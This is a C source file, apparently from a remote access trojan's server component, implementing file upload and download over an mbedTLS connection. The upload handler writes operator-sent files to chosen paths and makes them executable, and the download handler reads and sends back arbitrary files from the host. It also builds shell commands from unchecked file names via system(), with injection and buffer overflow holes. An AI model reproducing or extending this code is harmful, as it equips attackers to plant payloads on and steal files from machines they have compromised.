#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <strings.h>
#include <sys/stat.h>

#include "mbedtls/ssl.h"
#include "mbedtls/net.h"
#include "mbedtls/sha256.h"

#include "rat_server.h"

void upload_file(struct compression* decompress, struct ssl_conn* client_conn)
{
    size_t file_size = 0, size_recv = 0 ;
    FILE* remote_file;
    char *first_file = NULL, *second_file_original = NULL, *command_start = NULL;
    char *command = (char*)malloc(BUFFER_SIZE);
    unsigned int remain_data = 0;
    unsigned char sha1_output[32];
    unsigned int j;
    mbedtls_sha256_context file_hash;

    memset(command, 0, BUFFER_SIZE);
    command_start = strncpy(command, (char*)decompress->orig_buffer, BUFFER_SIZE);
    strsep(&command, " ");
    first_file = strsep(&command, " ");
    second_file_original = strsep(&command, " ");
    #ifdef DEBUG
    printf("File upload: %s -> %s\n", first_file, second_file_original);
    #endif

    char second_file[] = "/tmp/tempXXXXXX";
    mktemp(second_file);

    remote_file = fopen(second_file, "wb");
    if (remote_file == NULL) {
        #ifdef DEBUG
        fprintf(stderr, "Failed to open file foo --> %s\n", strerror(errno));
        #endif
        exit(-1);
    }

    file_size = 0;
    size_recv = 0;
    if ((size_recv = mbedtls_ssl_read(&client_conn->ssl_fd, (unsigned char*) &file_size, sizeof(size_t))) > 0) {
        if (size_recv == (unsigned int)-1) {
            perror("Error recving");
        }
    }
    #ifdef DEBUG
    printf("File size %zd\n", file_size);
    #endif

    //Initialize SHA1 hash
    mbedtls_sha256_init(&file_hash);
    mbedtls_sha256_starts(&file_hash, 0);

    remain_data = 0;
    memset(decompress->transformed_buffer, 0, BUFFER_SIZE); 
    memset(decompress->orig_buffer, 0, BUFFER_SIZE); 
    while (((decompress->orig_size = mbedtls_ssl_read(&client_conn->ssl_fd, decompress->orig_buffer, BUFFER_SIZE)) > 0) || (remain_data < file_size)) {
        decompress_buffer(decompress);
        mbedtls_sha256_update(&file_hash, decompress->transformed_buffer, decompress->transformed_size);
        remain_data += fwrite(decompress->transformed_buffer, 1, decompress->transformed_size, remote_file);
        #ifdef DEBUG
        fprintf(stdout, "Received %d bytes out of %d bytes\n", decompress->transformed_size, (int)file_size);
        #endif
        memset(decompress->orig_buffer, 0, BUFFER_SIZE); 
        memset(decompress->transformed_buffer, 0, BUFFER_SIZE); 
        if (remain_data == file_size) {
            break;
        }
    }
    fclose(remote_file);

    // decode file now
    char decode_command[100];
    memset(decode_command, 0, 100);
    strncat(decode_command, "base64 --decode ", 17);
    strncat(decode_command, second_file, strlen(second_file));
    strncat(decode_command, " > ", 4);
    strncat(decode_command, second_file_original, strlen(second_file_original));

    system(decode_command);

    memset(decode_command, 0, 100);
    strncat(decode_command, "rm -f ", 7);
    strncat(decode_command, second_file, strlen(second_file));
    system(decode_command);
    #ifdef DEBUG
    printf("Finished writing file %s\n", second_file_original);
    #endif

    //Hash check
    mbedtls_sha256_finish(&file_hash, sha1_output);
    #ifdef DEBUG
    printf("\nSha1 hash: ");
    for (j = 0; j < sizeof(sha1_output); j++) {
        printf("%02x", sha1_output[j]);
    }
    printf("\n");
    #endif

    if (mbedtls_ssl_write(&client_conn->ssl_fd, sha1_output, sizeof(sha1_output)) < 0) {
        #ifdef DEBUG
        printf("Error sending SHA1 hash\n");
        #endif
    }

    #ifdef DEBUG
    printf("Changing permissions to 700\n");
    #endif
    if (chmod(second_file_original, S_IRWXU) == -1) {
        //Should just send this over the socket
        #ifdef DEBUG
        printf("Unable to chmod\n");
        #endif
    }

    free(command_start);

    return;
}

void download_file(struct compression* compress, struct ssl_conn* client_conn)
{
    int fd = 0;
    size_t file_size = 0, sent_bytes = 0, total_sent = 0;
    FILE* remote_file = NULL;
    char *first_file_original = NULL, *second_file = NULL, *command_start = NULL;
    char *command = (char*)malloc(BUFFER_SIZE);
    unsigned int remain_data = 0;
    unsigned char sha1_output[32];
    unsigned int i = 0;
    struct stat st;
    mbedtls_sha256_context file_hash;

    memset(command, 0, BUFFER_SIZE);
    command_start = strncpy(command, (char*)compress->orig_buffer, BUFFER_SIZE);
    if (strsep(&command, " ") == NULL){
        perror("Error parsing download");
    }
    first_file_original = strsep(&command, " ");
    second_file = strsep(&command, " ");
    #ifdef DEBUG
    printf("File download: %s -> %s\n", first_file_original, second_file);
    #endif

    // encode file before sending
    char first_file[] = "/tmp/dummyXXXXXX";
    mktemp(first_file);

    char encode_command[100];
    memset(encode_command, 0, 100);
    strncat(encode_command, "base64 ", 8);
    strncat(encode_command, first_file_original, strlen(first_file_original));
    strncat(encode_command, " > ", 4);
    strncat(encode_command, first_file, strlen(first_file));

    system(encode_command);

    memset(compress->orig_buffer, 0, BUFFER_SIZE);
    memset(compress->transformed_buffer, 0, BUFFER_SIZE);
    if (access(first_file, F_OK) == -1) {
        #ifdef DEBUG
        printf("File not found\n");
        #endif
        if ( mbedtls_ssl_write(&client_conn->ssl_fd, (unsigned char*)&file_size, sizeof(file_size)) == -1 ) {
            #ifdef DEBUG
            printf("Error: %s", strerror(errno));
            #endif
            return;
        }
        strncpy((char*)compress->orig_buffer, "File doesn't exist", BUFFER_SIZE);
        compress_buffer(compress);
        mbedtls_ssl_write(&client_conn->ssl_fd, compress->transformed_buffer, compress->transformed_size);
        free(command_start);
        return;
    }
    if (access(first_file, R_OK) == -1) {
        if ( mbedtls_ssl_write(&client_conn->ssl_fd, (unsigned char*)&file_size, sizeof(file_size)) == -1 ) {
            #ifdef DEBUG
            printf("Error: %s", strerror(errno));
            #endif
            return;
        }
        strncpy((char*)compress->orig_buffer, "Insufficient permissions", BUFFER_SIZE);
        compress_buffer(compress);
        mbedtls_ssl_write(&client_conn->ssl_fd, compress->transformed_buffer, compress->transformed_size);
        free(command_start);
        return;
    }

    //Get local file size
    memset(&st, 0, sizeof(struct stat));
    if (stat(first_file, &st) == -1) {
        perror("stat error");
    }

    //Get the file size
    file_size = st.st_size;
    #ifdef DEBUG
    printf("File size %zd\n", file_size);
    #endif

    if (file_size == 0){
        if ( mbedtls_ssl_write(&client_conn->ssl_fd, (unsigned char*)&file_size, sizeof(file_size)) == -1 ) {
            #ifdef DEBUG
            printf("Error: %s", strerror(errno));
            #endif
            return;
        }
        strncpy((char*)compress->orig_buffer, "Zero byte file", BUFFER_SIZE);
        compress_buffer(compress);
        mbedtls_ssl_write(&client_conn->ssl_fd, compress->transformed_buffer, compress->transformed_size);
        free(command_start);
        return;
    }

    remote_file = fopen(first_file, "rb");
    if (remote_file == NULL) {
        #ifdef DEBUG
        fprintf(stderr, "Failed to open file foo --> %s\n", strerror(errno));
        #endif
        exit(-1);
    }

    fd = fileno(remote_file);
    if (fd == -1) {
        perror("Unable to get fileno");
    }

    //Send file size for the other side to receive
    if ( mbedtls_ssl_write(&client_conn->ssl_fd, (unsigned char*)&file_size, sizeof(file_size)) == -1 ) {
        #ifdef DEBUG
        printf("Error: %s", strerror(errno));
        #endif
        return;
    }

    remain_data = file_size;
    sent_bytes = 0;
    total_sent = 0;

    //Initialize for SHA256 hash
    mbedtls_sha256_init(&file_hash);
    mbedtls_sha256_starts(&file_hash, 0);

    memset(compress->orig_buffer, 0, BUFFER_SIZE);
    memset(compress->transformed_buffer, 0, BUFFER_SIZE);
    compress->orig_size = 0;
    compress->transformed_size = 0;
    // Sending file data
    while ((compress->orig_size = fread((char*) compress->orig_buffer, 1, BUFFER_SIZE, remote_file)) > 0) {
        mbedtls_sha256_update(&file_hash, compress->orig_buffer, compress->orig_size);
        compress_buffer(compress);
        sent_bytes = mbedtls_ssl_write(&client_conn->ssl_fd, compress->transformed_buffer, compress->transformed_size);
        #ifdef DEBUG
        fprintf(stdout, "Sent %zu bytes from file's data, remaining data = %d\n", sent_bytes, remain_data);
        #endif
        total_sent += compress->orig_size;
        remain_data -= compress->orig_size;
        memset(compress->orig_buffer, 0, BUFFER_SIZE);
        memset(compress->transformed_buffer, 0, BUFFER_SIZE);
    }

    if (total_sent < file_size) {
        #ifdef DEBUG
        fprintf(stderr, "incomplete transfer from sendfile: %zu of %zu bytes\n", total_sent, file_size);
        #endif
    } else {
        #ifdef DEBUG
        printf("Finished transferring %s\n", first_file_original);
        #endif
    }

    mbedtls_sha256_finish(&file_hash, sha1_output);
    #ifdef DEBUG
    printf("\nSHA1 hash: ");
    for (i = 0; i < sizeof(sha1_output); i++) {
        printf("%02x", sha1_output[i]);
    }
    printf("\n");
    #endif

    if (mbedtls_ssl_write(&client_conn->ssl_fd, sha1_output, sizeof(sha1_output)) < 0) {
        //Should probably check this eventually
        #ifdef DEBUG
        printf("Error recving Sha1 hash\n");
        #endif
    }

    mbedtls_sha256_free(&file_hash);
    fclose(remote_file);
    free(command_start);

    memset(encode_command, 0, 100);
    strncat(encode_command, "rm -f ", 7);
    strncat(encode_command, first_file, strlen(first_file));
    system(encode_command);

    return;
}

